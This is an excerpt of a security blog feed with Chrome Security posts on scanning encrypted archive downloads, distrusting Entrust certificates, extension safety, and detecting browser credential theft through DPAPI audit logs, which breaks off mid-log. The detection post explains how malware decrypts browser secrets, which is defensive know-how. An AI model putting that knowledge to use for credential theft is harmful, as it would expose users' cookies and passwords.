</p><p></p><div class="separator" style="clear: both; text-align: center;"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhYi1YW6gCA9xGgTp67Z7QVvH6guYbAVN6HUl1XrOxAYHS308MtmpVddM83GMVWa8OUtctfL5HA0gMopBIgw8qNX3OXD6j_8HWKYyfzy0nwhFYxvhiJIsx3W251jg8Jnv2Wx4_X3WuNO5YNnJbxU52ru8maUatuULjEGYBNqR0fuJp181b9Gje9tllPDROo/s1080/Chrome_Auto-Scan-Block_Inline_V1.gif" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhYi1YW6gCA9xGgTp67Z7QVvH6guYbAVN6HUl1XrOxAYHS308MtmpVddM83GMVWa8OUtctfL5HA0gMopBIgw8qNX3OXD6j_8HWKYyfzy0nwhFYxvhiJIsx3W251jg8Jnv2Wx4_X3WuNO5YNnJbxU52ru8maUatuULjEGYBNqR0fuJp181b9Gje9tllPDROo/s16000/Chrome_Auto-Scan-Block_Inline_V1.gif" /></a></div><p></p><p style="text-align: center;">
<em>An automatic deep scan resulting in a warning</em>
</p>
<p style="text-align: left;">
<strong>Staying ahead of attackers who hide in encrypted archives</strong>
</p>
<p>
Not all deep scans can be conducted automatically. A current trend in <a href="https://blog.google/threat-analysis-group/phishing-campaign-targets-youtube-creators-cookie-theft-malware/">cookie theft</a> malware distribution is packaging malicious software in an encrypted archive – a .zip, .7z, or .rar file, protected by a password – which hides file contents from Safe Browsing and other antivirus detection scans. In order to combat this evasion technique, we have introduced two protection mechanisms depending on the mode of Safe Browsing selected by the user in Chrome.
</p>
<p>
Attackers often make the passwords to encrypted archives available in places like the page from which the file was downloaded, or in the download file name. For Enhanced Protection users, downloads of suspicious encrypted archives will now prompt the user to enter the file's password and send it along with the file to Safe Browsing so that the file can be opened and a deep scan may be performed. Uploaded files and file passwords are deleted a short time after they're scanned, and all collected data is only used by Safe Browsing to provide better download protections.
</p><p></p><div class="separator" style="clear: both; text-align: center;"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgeWn18o6NDzNv7ILTz4Hv-U-4kH-WUx8goTr_8HavUJIn_f3vW9DKGJYxd0rmElQdxeYFp6bPmHU3XJkGnZUToAsdkSE_i_xjv7d4CEzR-7crVH3z2jLtOynwIeJYXBbddPfas_-rfSS3R-sbAZkpR3zQyCAiBCpXB4xzc7CUuyPkDRPdlx8lCtAIa5m2_/s1080/FilePassword_inline_Option%2003%20(More%20cropped%20in).png" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgeWn18o6NDzNv7ILTz4Hv-U-4kH-WUx8goTr_8HavUJIn_f3vW9DKGJYxd0rmElQdxeYFp6bPmHU3XJkGnZUToAsdkSE_i_xjv7d4CEzR-7crVH3z2jLtOynwIeJYXBbddPfas_-rfSS3R-sbAZkpR3zQyCAiBCpXB4xzc7CUuyPkDRPdlx8lCtAIa5m2_/s16000/FilePassword_inline_Option%2003%20(More%20cropped%20in).png" /></a></div><p></p><p style="text-align: center;">
<em>Enter a file password to send an encrypted file for a malware scan</em>
</p>
<p style="text-align: left;">
For those who use Standard Protection mode which is the default in Chrome, we still wanted to be able to provide some level of protection. In Standard Protection mode, downloading a suspicious encrypted archive will also trigger a prompt to enter the file's password, but in this case, both the file and the password stay on the local device and only the metadata of the archive contents are checked with Safe Browsing. As such, in this mode, users are still protected as long as Safe Browsing had previously seen and categorized the malware.
</p>
<p>
The Chrome Security team works closely with Safe Browsing, Google's <a href="https://blog.google/threat-analysis-group/">Threat Analysis Group</a>, and security researchers from around the world to gain insights into the techniques attackers are using. Using these insights, we are constantly adapting our product strategy to stay ahead of attackers and to keep users safe while downloading files in Chrome. We look forward to sharing more in the future!
</p>
]]></content:encoded>
<pubDate>2024-07-24T12:01:36.224-04:00</pubDate>
</item>
<item>
<title>Sustaining Digital Certificate Security - Entrust Certificate Distrust</title>
<link>http://security.googleblog.com/2024/06/sustaining-digital-certificate-security.html</link>
<guid>http://security.googleblog.com/2024/06/sustaining-digital-certificate-security.html</guid>
<content:encoded><![CDATA[
<span class="byline-author">Posted by Chrome Root Program, Chrome Security Team</span>

<p>
<em><b>Update (07/22/2024): </b>Website operators who will be impacted by the upcoming change in Chrome for new TLS certificates issued after October 31, 2024 can explore continuity options offered by Entrust. Entrust has expressed its commitment to continuing to support customer needs, and is best positioned to describe the available options for website operators. Learn more at Entrust’s <a href="https://www.entrust.com/tls-certificate-information-center">TLS Certificate Information Center</a>.</em>
</p>

    

<p>
The Chrome Security Team prioritizes the security and privacy of Chrome’s users, and we are unwilling to compromise on these values.
</p>
<p>
The <a href="https://www.chromium.org/Home/chromium-security/root-ca-policy/">Chrome Root Program Policy</a> states that CA certificates included in the <a href="https://chromium.googlesource.com/chromium/src/+/main/net/data/ssl/chrome_root_store/root_store.md">Chrome Root Store</a> must provide value to Chrome end users that exceeds the risk of their continued inclusion. It also describes many of the <a href="https://www.chromium.org/Home/chromium-security/root-ca-policy/#7-reporting-and-responding-to-incidents">factors</a> we consider significant when CA Owners disclose and respond to incidents. When things don’t go right, we expect CA Owners to commit to meaningful and demonstrable change resulting in evidenced continuous improvement.  
</p>
<p>
Over the past several years, publicly disclosed <a href="https://bugzilla.mozilla.org/buglist.cgi?o2=greaterthaneq&amp;short_desc_type=casesubstring&amp;o1=notequals&amp;v1=Graveyard&amp;classification=Client%20Software&amp;classification=Developer%20Infrastructure&amp;classification=Components&amp;classification=Server%20Software&amp;classification=Other&amp;classification=Graveyard&amp;v2=2015-11-01&amp;f1=classification&amp;bug_status=UNCONFIRMED&amp;bug_status=NEW&amp;bug_status=ASSIGNED&amp;bug_status=REOPENED&amp;bug_status=RESOLVED&amp;bug_status=VERIFIED&amp;bug_status=CLOSED&amp;short_desc=Entrust&amp;f2=creation_ts&amp;component=CA%20Certificate%20Compliance&amp;query_format=advanced&amp;list_id=17064895">incident reports</a> highlighted a pattern of concerning behaviors by Entrust that fall short of the above expectations, and has eroded confidence in their competence, reliability, and integrity as a publicly-trusted CA Owner. 
</p>
<p>
In response to the above concerns and to preserve the integrity of the <a href="https://security.googleblog.com/2023/05/how-chrome-root-program-keeps-users-safe.html#:~:text=Chrome%20uses%20digital,the%20%E2%80%9CWeb%20PKI.%E2%80%9D">Web PKI</a> ecosystem, Chrome will take the following actions. 
</p>
<p>
<span style="text-decoration: underline;">Upcoming change in Chrome 127 and higher:</span>
</p>
<ul style="text-align: left;">

<li>TLS server authentication certificates validating to the following Entrust roots whose <em>earliest</em> Signed Certificate Timestamp (SCT) is dated <span style="text-decoration: underline;">after</span> <strong>October 31, 2024,</strong> will no longer be trusted by default. 
<ul>
 
<li><a href="https://crt.sh/?q=02ED0EB28C14DA45165C566791700D6451D7FB56F0B2AB1D3B8EB070E56EDFF5">CN=Entrust Root Certification Authority - EC1,OU=See www.entrust.net/legal-terms+OU=(c) 2012 Entrust, Inc. - for authorized use only,O=Entrust, Inc.,C=US</a> 
 
</li><li><a href="https://crt.sh/?q=43DF5774B03E7FEF5FE40D931A7BEDF1BB2E6B42738C4E6D3841103D3AA7F339">CN=Entrust Root Certification Authority - G2,OU=See www.entrust.net/legal-terms+OU=(c) 2009 Entrust, Inc. - for authorized use only,O=Entrust, Inc.,C=US</a>
 
</li><li><a href="https://crt.sh/?q=6DC47172E01CBCB0BF62580D895FE2B8AC9AD4F873801E0C10B9C837D21EB177">CN=Entrust.net Certification Authority (2048),OU=www.entrust.net/CPS_2048 incorp. by ref. (limits liab.)+OU=(c) 1999 Entrust.net Limited,O=Entrust.net</a>
 
</li><li><a href="https://crt.sh/?q=73C176434F1BC6D5ADF45B0E76E727287C8DE57616C1E6E6141A2B2CBC7D8E4C">CN=Entrust Root Certification Authority,OU=www.entrust.net/CPS is incorporated by reference+OU=(c) 2006 Entrust, Inc.,O=Entrust, Inc.,C=US</a>
 
</li><li><a href="https://crt.sh/?q=DB3517D1F6732A2D5AB97C533EC70779EE3270A62FB4AC4238372460E6F01E88">CN=Entrust Root Certification Authority - G4,OU=See www.entrust.net/legal-terms+OU=(c) 2015 Entrust, Inc. - for authorized use only,O=Entrust, Inc.,C=US</a>
 
</li><li><a href="https://crt.sh/?q=0376AB1D54C5F9803CE4B2E201A0EE7EEF7B57B636E8A93C9B8D4860C96F5FA7">CN=AffirmTrust Commercial,O=AffirmTrust,C=US</a>
 
</li><li><a href="https://crt.sh/?q=0A81EC5A929777F145904AF38D5D509F66B5E2C58FCDB531058B0E17F3F0B41B">CN=AffirmTrust Networking,O=AffirmTrust,C=US</a>
 
</li><li><a href="https://crt.sh/?q=70A73F7F376B60074248904534B11482D5BF0E698ECC498DF52577EBF2E93B9A">CN=AffirmTrust Premium,O=AffirmTrust,C=US</a>
 
</li><li><a href="https://crt.sh/?q=BD71FDF6DA97E4CF62D1647ADD2581B07D79ADF8397EB4ECBA9C5E8488821423">CN=AffirmTrust Premium ECC,O=AffirmTrust,C=US</a>	
</li></ul></li><li>TLS server authentication certificates validating to the above set of roots whose <em>earliest</em> SCT is <span>on or before</span> <strong>October 31, 2024,</strong> will be unaffected by this change.</li></ul>This approach attempts to minimize disruption to existing subscribers using a recently announced Chrome <a href="https://source.chromium.org/chromium/chromium/src/+/main:net/cert/root_store.proto;drc=a783c3bab474ff68e675e2753f91c92ca817e072;l=15?q=f:root_store.proto&amp;ss=chromium">feature</a> to remove default trust based on the SCTs in certificates.<br />
<p>
Additionally, should a Chrome user or enterprise <a href="https://chromium.googlesource.com/chromium/src/+/main/net/data/ssl/chrome_root_store/faq.md#Does-the-Chrome-Certificate-Verifier-consider-local-trust-decisions">explicitly trust</a> any of the above certificates on a platform and version of Chrome <a href="https://chromium.googlesource.com/chromium/src/+/main/net/data/ssl/chrome_root_store/faq.md#when-did-these-features-land">relying</a> on the <a href="https://chromium.googlesource.com/chromium/src/+/main/net/data/ssl/chrome_root_store/root_store.md">Chrome Root Store</a> (e.g., explicit trust is conveyed through a Group Policy Object on Windows), the SCT-based constraints described above will be overridden and certificates will function as they do today.  
</p>
<p>
To further minimize risk of disruption, website operators are encouraged to review the “Frequently Asked Questions" listed below.
</p>
<h3><strong>Why is Chrome taking action?</strong></h3>


<p>
Certification Authorities (CAs) serve a privileged and trusted role on the Internet that underpin encrypted connections between browsers and websites. With this tremendous responsibility comes an expectation of adhering to reasonable and consensus-driven security and compliance expectations, including those defined by the CA/Browser TLS Baseline Requirements.  
</p>
<p>
Over the past six years, we have observed a pattern of compliance failures, unmet improvement commitments, and the absence of tangible, measurable progress in response to publicly disclosed incident reports. When these factors are considered in aggregate and considered against the inherent risk each publicly-trusted CA poses to the Internet ecosystem, it is our opinion that Chrome’s continued trust in Entrust is no longer justified. 
</p>
<h3><strong>When will this action happen?</strong></h3>


<p>
Blocking action will begin on approximately November 1, 2024, affecting certificates issued at that point or later.
</p>
<p>
Blocking action will occur in Versions of <a href="https://chromiumdash.appspot.com/schedule">Chrome 127</a> and greater on Windows, macOS, ChromeOS, Android, and Linux. Apple policies prevent the Chrome Certificate Verifier and corresponding Chrome Root Store from being used on Chrome for iOS.
</p>
<h3><strong>What is the user impact of this action?</strong></h3>


<p>
By default, Chrome users in the above populations who navigate to a website serving a certificate issued by Entrust or AffirmTrust after October 31, 2024 will see a full page interstitial <a href="https://untrusted-root.badssl.com/">similar to this one</a>.
</p>
<p>
Certificates issued by other CAs are not impacted by this action.
</p>
<h3><strong>How can a website operator tell if their website is affected?</strong></h3>


<p>
Website operators can determine if they are affected by this issue by using the Chrome Certificate Viewer.
</p>
<p>
<span style="text-decoration: underline;">Use the Chrome Certificate Viewer</span>
</p>
<ul>

<li>Navigate to a website (e.g., <a href="https://www.google.com">https://www.google.com</a>)

</li><li>Click the “Tune" icon

</li><li>Click “Connection is Secure" 

</li><li>Click “Certificate is Valid" (the Chrome Certificate Viewer will open) 
<ul>
 
<li><strong>Website owner action is&nbsp;<span style="text-decoration: underline;">not</span> required</strong>, if the “Organization (O)” field listed beneath the “Issued By" heading <span style="text-decoration: underline;">does not</span> contain “Entrust" or “AffirmTrust”.
 
</li><li><strong>Website owner action is required</strong>, if the “Organization (O)” field listed beneath the “Issued By" heading contains “Entrust" or “AffirmTrust”.
</li> 
</ul>
</li> 
</ul>
<h3><strong>What does an affected website operator do?</strong></h3>


<p>
We recommend that affected website operators transition to a new publicly-trusted CA Owner as soon as reasonably possible. To avoid adverse website user impact, action <strong>must</strong> be completed <span style="text-decoration: underline;">before</span> the existing certificate(s) expire if expiry is planned to take place <span style="text-decoration: underline;">after</span> October 31, 2024. 
</p>
<p>
While website operators could delay the impact of blocking action by choosing to collect and install a new TLS certificate issued from Entrust before Chrome’s blocking action begins on November 1, 2024, website operators will inevitably need to collect and install a new TLS certificate from one of the many other CAs included in the <a href="https://chromium.googlesource.com/chromium/src/+/main/net/data/ssl/chrome_root_store/root_store.md">Chrome Root Store</a>.
</p>
<h3><strong>Can I test these changes before they take effect?</strong></h3>


<p>
Yes.
</p>
<p>
A command-line flag was added beginning in Chrome 128 (available in Canary/Dev at the time of this post’s publication) that allows administrators and power users to simulate the effect of an SCTNotAfter distrust constraint as described in this blog post FAQ.
</p>
<p>
<span style="text-decoration: underline;">How to: Simulate an SCTNotAfter distrust</span></p><p>1. Close all open versions of Chrome</p><p>2. Start Chrome using the following command-line flag, substituting variables described below with actual values</p>

<div class="code">
--test-crs-constraints=$[Comma Separated List of Trust Anchor Certificate SHA256 Hashes]:sctnotafter=$[epoch_timestamp]
</div><p>

</p><p>3. Evaluate the effects of the flag with test websites&nbsp;</p><p><b>Example:</b>&nbsp;The following command will simulate an SCTNotAfter distrust with an effective date of April 30, 2024 11:59:59 PM GMT for all of the Entrust trust anchors included in the Chrome Root Store. The expected behavior is that any website whose certificate is issued before the enforcement date/timestamp will function in Chrome, and all issued after will display an interstitial.</p><p>
  </p><div class="code">
--test-crs-constraints=02ED0EB28C14DA45165C566791700D6451D7FB56F0B2AB1D3B8EB070E56EDFF5,
43DF5774B03E7FEF5FE40D931A7BEDF1BB2E6B42738C4E6D3841103D3AA7F339,
6DC47172E01CBCB0BF62580D895FE2B8AC9AD4F873801E0C10B9C837D21EB177,
73C176434F1BC6D5ADF45B0E76E727287C8DE57616C1E6E6141A2B2CBC7D8E4C,
DB3517D1F6732A2D5AB97C533EC70779EE3270A62FB4AC4238372460E6F01E88,
0376AB1D54C5F9803CE4B2E201A0EE7EEF7B57B636E8A93C9B8D4860C96F5FA7,
0A81EC5A929777F145904AF38D5D509F66B5E2C58FCDB531058B0E17F3F0B41B,
70A73F7F376B60074248904534B11482D5BF0E698ECC498DF52577EBF2E93B9A,
BD71FDF6DA97E4CF62D1647ADD2581B07D79ADF8397EB4ECBA9C5E8488821423
:sctnotafter=1714521599
</div>
<p><strong>Illustrative Command (on Windows):</strong>
</p><div class="code">
"C:\Users\User123\AppData\Local\Google\Chrome SxS\Application\chrome.exe" --test-crs-constraints=02ED0EB28C14DA45165C566791700D6451D7FB56F0B2AB1D3B8EB070E56EDFF5,43DF5774B03E7FEF5FE40D931A7BEDF1BB2E6B42738C4E6D3841103D3AA7F339,6DC47172E01CBCB0BF62580D895FE2B8AC9AD4F873801E0C10B9C837D21EB177,73C176434F1BC6D5ADF45B0E76E727287C8DE57616C1E6E6141A2B2CBC7D8E4C,DB3517D1F6732A2D5AB97C533EC70779EE3270A62FB4AC4238372460E6F01E88,0376AB1D54C5F9803CE4B2E201A0EE7EEF7B57B636E8A93C9B8D4860C96F5FA7,0A81EC5A929777F145904AF38D5D509F66B5E2C58FCDB531058B0E17F3F0B41B,70A73F7F376B60074248904534B11482D5BF0E698ECC498DF52577EBF2E93B9A,BD71FDF6DA97E4CF62D1647ADD2581B07D79ADF8397EB4ECBA9C5E8488821423:sctnotafter=1714521599
</div><p><strong>Illustrative Command (on macOS):</strong>
</p><div class="code">
"/Applications/Google Chrome Canary.app/Contents/MacOS/Google Chrome Canary" --test-crs-constraints=02ED0EB28C14DA45165C566791700D6451D7FB56F0B2AB1D3B8EB070E56EDFF5,43DF5774B03E7FEF5FE40D931A7BEDF1BB2E6B42738C4E6D3841103D3AA7F339,6DC47172E01CBCB0BF62580D895FE2B8AC9AD4F873801E0C10B9C837D21EB177,73C176434F1BC6D5ADF45B0E76E727287C8DE57616C1E6E6141A2B2CBC7D8E4C,DB3517D1F6732A2D5AB97C533EC70779EE3270A62FB4AC4238372460E6F01E88,0376AB1D54C5F9803CE4B2E201A0EE7EEF7B57B636E8A93C9B8D4860C96F5FA7,0A81EC5A929777F145904AF38D5D509F66B5E2C58FCDB531058B0E17F3F0B41B,70A73F7F376B60074248904534B11482D5BF0E698ECC498DF52577EBF2E93B9A,BD71FDF6DA97E4CF62D1647ADD2581B07D79ADF8397EB4ECBA9C5E8488821423:sctnotafter=1714521599
</div><p><strong>Note: </strong>If copy and pasting the above commands, ensure no line-breaks are introduced. 
</p><p>
Learn more about command-line flags <a href="https://developer.chrome.com/docs/web-platform/chrome-flags#command-line_flags">here</a>.
</p><h3><strong>I use Entrust certificates for my internal enterprise network, do I need to do anything?</strong></h3><p>
Beginning in Chrome 127, enterprises can override Chrome Root Store constraints like those described for Entrust in this blog post by installing the corresponding root CA certificate as a <a href="https://chromium.googlesource.com/chromium/src/+/main/net/data/ssl/chrome_root_store/faq.md#Does-the-Chrome-Certificate-Verifier-consider-local-trust-decisions">locally-trusted root</a> on the platform Chrome is running (e.g., installed in the Microsoft Certificate Store as a Trusted Root CA).
</p><h3><strong>How do enterprises add a CA as locally-trusted?</strong></h3><p>
Customer organizations should defer to platform provider guidance. 
</p><h3><strong>What about other Google products?</strong></h3><p>
Other Google product team updates may be made available in the future.</p><p></p><p></p>
]]></content:encoded>
<pubDate>2024-07-22T14:53:37.400-04:00</pubDate>
</item>
<item>
<title>Staying Safe with Chrome Extensions</title>
<link>http://security.googleblog.com/2024/06/staying-safe-with-chrome-extensions.html</link>
<guid>http://security.googleblog.com/2024/06/staying-safe-with-chrome-extensions.html</guid>
<content:encoded><![CDATA[
<span class="byline-author">Posted by Benjamin Ackerman, Anunoy Ghosh and David Warren, Chrome Security Team </span>


    



<p>
Chrome extensions can boost your browsing, empowering you to do anything from customizing the look of sites to providing personalized advice when you’re planning a vacation. But as with any software, extensions can also introduce risk. 
</p>
<p>
That’s why we have a team whose only job is to focus on keeping you safe as you install and take advantage of Chrome extensions. Our team:<br />
</p>
<ul>

<li>Provides you with a personalized summary of the extensions you’ve installed

</li><li>Reviews extensions before they’re published on the Chrome Web Store

</li><li>Continuously monitors extensions after they’re published
</li>
</ul>
<h3 style="text-align: left;">A summary of your extensions</h3>


<p>
The top of the extensions page (chrome://extensions) warns you of any extensions you have installed that might pose a security risk. (If you don’t see a warning panel, you probably don’t have any extensions you need to worry about.) The panel includes:
</p>
<ul>

<li>Extensions suspected of including malware

</li><li>Extensions that violate Chrome Web Store policies

</li><li>Extensions that have been unpublished by a developer, which might indicate that an extension is no longer supported

</li><li>Extensions that aren’t from the <a href="chromewebstore.google.com/">Chrome Web Store</a>

</li><li>Extensions that haven’t published what they do with data they collect and other privacy practices  
</li>
</ul>
<p>
You’ll get notified when Chrome’s Safety Check has recommendations for you or you can check on your own by running Safety Check. Just type “run safety check” in Chrome’s address bar and select the corresponding shortcut: “Go to Chrome safety check.”</p><div class="separator" style="clear: both; text-align: center;"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgGnX_FKYFwb8VZZcQnZ3-XBpz2N_7yicx-E6FYd0gPL2-WtKiKStwT6-9h-i6y-wlxaFuCriKKNceyRJxSIBkP4V2b0-rk-TK0C9XNxivbsUmpJe3o7TCrlAlKS2eO39XDVePBHjwjI9AqOnCcs-X7qiiFL3wfozInqP5FxGs4dykCva0QObfrWxAqd2g5/s1920/PS_Extension-Review-Panel_V3.gif" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgGnX_FKYFwb8VZZcQnZ3-XBpz2N_7yicx-E6FYd0gPL2-WtKiKStwT6-9h-i6y-wlxaFuCriKKNceyRJxSIBkP4V2b0-rk-TK0C9XNxivbsUmpJe3o7TCrlAlKS2eO39XDVePBHjwjI9AqOnCcs-X7qiiFL3wfozInqP5FxGs4dykCva0QObfrWxAqd2g5/s16000/PS_Extension-Review-Panel_V3.gif" /></a></div>

<p style="text-align: center;">
<em>User flow of removing extensions highlighted by Safety Check.</em>
</p>
<p style="text-align: left;">
Besides the Safety Check, you can visit the extensions page directly in a number of ways:
</p>
<ul>

<li>Navigate to chrome://extensions

</li><li>Click the puzzle icon and choose “Manage extensions”

</li><li>Click the More choices menu and choose menu &gt; Extensions &gt; Manage Extensions
</li>
</ul>
<h3 style="text-align: left;">Reviewing extensions before they’re published</h3>


<p>
Before an extension is even accessible to install from the Chrome Web Store, we have two levels of verification to ensure an extension is safe:
</p>
<ol>

<li><strong>An automated review</strong>: Each extension gets examined by our machine-learning systems to spot possible violations or suspicious behavior.

</li><li><strong>A human review</strong>: Next, a team member examines the images, descriptions, and public policies of each extension. Depending on the results of both the automated and manual review, we may perform an even deeper and more thorough review of the code. 
</li>
</ol>
<p>
This review process weeds out the overwhelming majority of bad extensions before they even get published. In 2024, less than 1% of all installs from the Chrome Web Store were found to include malware. We're proud of this record and yet some bad extensions still get through, which is why we also monitor published extensions.
</p>
<h3 style="text-align: left;">Monitoring published extensions</h3>


<p>
The same Chrome team that reviews extensions before they get published also reviews extensions that are already on the Chrome Web Store. And just like the pre-check, this monitoring includes both human and machine reviews. We also work closely with trusted security researchers outside of Google, and even pay researchers who report possible threats to Chrome users through our <a href="https://bughunters.google.com/about/rules/5878023369523200/developer-data-protection-reward-program-rules#chrome-extensions">Developer Data Protection Rewards Program</a>.
</p>
<p>
What about extensions that get updated over time, or are programmed to execute malicious code at a later date? Our systems monitor for that as well, by periodically reviewing what extensions are actually doing and comparing that to the stated objectives defined by each extension in the Chrome Web Store.
</p>
<p>
If the team finds that an extension poses a severe risk to Chrome users, it’s immediately remove from the Chrome Web Store and the extension gets disabled on all browsers that have it installed.</p><div class="separator" style="clear: both; text-align: center;"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh5EZOqvRh5BCBErZ6qEN2pXYDPjbCUXL8VmMKCXo-Hz57cfx9yMD97oCmoZ2qpHOGM-3rAPkoStj458SJLdFSz2lNKq6ggIsbb31Paa2uEK_j1YsHlJVnk0wWkRRxQpYjAKWHkldOktUBtVLLogyHg40TTt4SdqY4aQFit9PhYdDT6RJrgwrW0xN5vNeZg/s2000/Chrome_Privacy-Sandbox_Extensions-Safety-Blog-In-line-Asset-1.png" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh5EZOqvRh5BCBErZ6qEN2pXYDPjbCUXL8VmMKCXo-Hz57cfx9yMD97oCmoZ2qpHOGM-3rAPkoStj458SJLdFSz2lNKq6ggIsbb31Paa2uEK_j1YsHlJVnk0wWkRRxQpYjAKWHkldOktUBtVLLogyHg40TTt4SdqY4aQFit9PhYdDT6RJrgwrW0xN5vNeZg/s16000/Chrome_Privacy-Sandbox_Extensions-Safety-Blog-In-line-Asset-1.png" /></a></div><p style="text-align: center;"><i>The extensions page highlights when you have a potentially unsafe extension downloaded</i></p>



<div class="code">
<h3 style="text-align: left;">Others steps you can take to stay safe</h3><div><br /></div><div><br /></div>


<h2 style="text-align: left;">Review new extensions before installing them</h2>


<p>
The Chrome Web Store provides useful information about each extension and its developer. The following information should help you decide whether it’s safe to install an extension: 
</p>
<ul>

<li><a href="https://blog.google/products/chrome/find-great-extensions-new-chrome-web-store-badges/">Verified and featured badges</a> are awarded by the Chrome team to extensions that follow our technical best practices and meet a high standard of user experience and design

</li><li>Ratings and reviews from our users

</li><li>Information about the developer

</li><li>Privacy practices, including information about how an extension handles your data
</li>
</ul>
<p>
Be careful of sites that try to quickly persuade you to install extensions, especially if the site has little in common with the extension.
</p>
<h2 style="text-align: left;">Review extensions you’ve already installed</h2>


<p>
Even though Safety Check and your Extensions page (chrome://extensions) warn you of extensions that might pose a risk, it’s still a good idea to review your extensions from time to time. 
</p>
<ol>

<li>Uninstall extensions that you no longer use.

</li><li>Review the description of an extension in the Chrome Web Store, considering the extension’s ratings, reviews, and privacy practices — reviews can change over time.

</li><li>Compare an extension’s stated goals with 1) the permissions requested by an extension and 2) the privacy practices published by the extension. If requested permissions don’t align with stated goals, consider uninstalling the extension.

</li><li><a href="https://support.google.com/chrome_webstore/answer/2664769?hl=en">Limit the sites</a> an extension has permission to work on. 
</li>
</ol>
<h2 style="text-align: left;">Enable Enhanced Protection</h2>


<p>
The Enhanced protection mode of Safe Browsing is Chrome’s <a href="https://security.googleblog.com/2022/12/enhanced-protection-strongest-level-of.html">highest level of protection</a> that we offer. Not only does this mode provide you with the best protections against phishing and malware, but it also provides additional features targeted to keep you safe against potentially harmful extensions. Threats are constantly evolving and Safe Browsing’s Enhanced protection mode is the best way to ensure that you have the most advanced security features in Chrome. This can be enabled from the Safe Browsing settings page in Chrome (chrome://settings/security) and selecting “Enhanced”.
</p>
</div>
]]></content:encoded>
<pubDate>2024-06-20T12:20:37.708-04:00</pubDate>
</item>
<item>
<title>Detecting browser data theft using Windows Event Logs</title>
<link>http://security.googleblog.com/2024/04/detecting-browser-data-theft-using.html</link>
<guid>http://security.googleblog.com/2024/04/detecting-browser-data-theft-using.html</guid>
<content:encoded><![CDATA[
<span class="byline-author">Posted by  Will Harris, Chrome Security Team</span>




    


<p>
</p>
<p>
</p>
<p>Chromium's sandboxed process model defends well from malicious web content, but there are limits to how well the application can protect itself from malware already on the computer. Cookies and other credentials remain a high value target for attackers, and we are trying to tackle this ongoing threat in multiple ways, including working on web standards like
  <a href="https://blog.chromium.org/2024/04/fighting-cookie-theft-using-device.html" target="_blank">DBSC</a>
  that will help disrupt the cookie theft industry since exfiltrating these cookies will no longer have any value.</p>
<p>Where it is not possible to prevent the theft of credentials and cookies by malware, the next best thing is making the attack more observable by antivirus, endpoint detection agents, or enterprise administrators with basic log analysis tools.</p>
<p>This blog describes one set of signals for use by system administrators or endpoint detection agents that should reliably flag any access to the browser’s protected data from another application on the system. By increasing the likelihood of an attack being detected, this changes the calculus for those attackers who might have a strong desire to remain stealthy, and might cause them to rethink carrying out these types of attacks against our users.</p>
<p>
  <strong>Background</strong>
</p>
<p>Chromium based browsers on Windows use the DPAPI (Data Protection API) to secure local secrets such as cookies, password etc. against theft. DPAPI protection is based on a key derived from the user's login credential and is designed to protect against unauthorized access to secrets from other users on the system, or when the system is powered off. Because the DPAPI secret is bound to the logged in user, it cannot protect against local malware attacks — malware executing as the user or at a higher privilege level can just call the same APIs as the browser to obtain the DPAPI secret.</p>
<p>Since 2013, Chromium has been applying the CRYPTPROTECT_AUDIT flag to DPAPI calls to request that an audit log be generated when decryption occurs, as well as tagging the data as being owned by the browser. Because all of Chromium's encrypted data storage is backed by a DPAPI-secured key, any application that wishes to decrypt this data, including malware, should always reliably generate a clearly observable event log, which can be used to detect these types of attacks.</p>
<p>There are three main steps involved in taking advantage of this log:</p>
<ol>
  <li>Enable logging on the computer running Google Chrome, or any other Chromium based browser.</li>
  <li>Export the event logs to your backend system.</li>
  <li>Create detection logic to detect theft.</li>
</ol>
<p>This blog will also show how the logging works in practice by testing it against a python password stealer.</p>
<p>
  <strong>Step 1: Enable logging on the system</strong>
</p>
<p>DPAPI events are logged into two places in the system. Firstly, there is the
  <a href="https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4693" target="_blank">4693</a> event that can be logged into the Security Log. This event can be enabled by turning on "Audit DPAPI Activity" and the steps to do this are described
  <a href="https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/audit-dpapi-activity" target="_blank">here</a>, the policy itself sits deep within Security Settings -&gt; Advanced Audit Policy Configuration -&gt; Detailed Tracking.</p>
<p>Here is what the 4693 event looks like:</p>
<div class="code">
&lt;Event xmlns&amp;equals&quot;http&amp;colon&amp;sol&amp;solschemas&amp;periodmicrosoft&amp;periodcom&amp;solwin&amp;sol2004&amp;sol08&amp;solevents&amp;solevent&quot;&gt;&amp;NewLine  &lt;System&gt;&amp;NewLine    &lt;Provider Name&amp;equals&quot;Microsoft-Windows-Security-Auditing&quot; Guid&amp;equals&quot;&amp;lcub&amp;period&amp;period&amp;period&amp;rcub&quot; &amp;sol&gt;&amp;NewLine    &lt;EventID&gt;4693&lt;&amp;solEventID&gt;&amp;NewLine    &lt;Version&gt;0&lt;&amp;solVersion&gt;&amp;NewLine    &lt;Level&gt;0&lt;&amp;solLevel&gt;&amp;NewLine    &lt;Task&gt;13314&lt;&amp;solTask&gt;&amp;NewLine    &lt;Opcode&gt;0&lt;&amp;solOpcode&gt;&amp;NewLine    &lt;Keywords&gt;0x8020000000000000&lt;&amp;solKeywords&gt;&amp;NewLine    &lt;TimeCreated SystemTime&amp;equals&quot;2015-08-22T06&amp;colon25&amp;colon14&amp;period589407700Z&quot; &amp;sol&gt;&amp;NewLine    &lt;EventRecordID&gt;175809&lt;&amp;solEventRecordID&gt;&amp;NewLine    &lt;Correlation &amp;sol&gt;&amp;NewLine    &lt;Execution ProcessID&amp;equals&quot;520&quot; ThreadID&amp;equals&quot;1340&quot; &amp;sol&gt;&amp;NewLine    &lt;Channel&gt;Security&lt;&amp;solChannel&gt;&amp;NewLine    &lt;Computer&gt;DC01&amp;periodcontoso&amp;periodlocal&lt;&amp;solComputer&gt;&amp;NewLine    &lt;Security &amp;sol&gt;&amp;NewLine 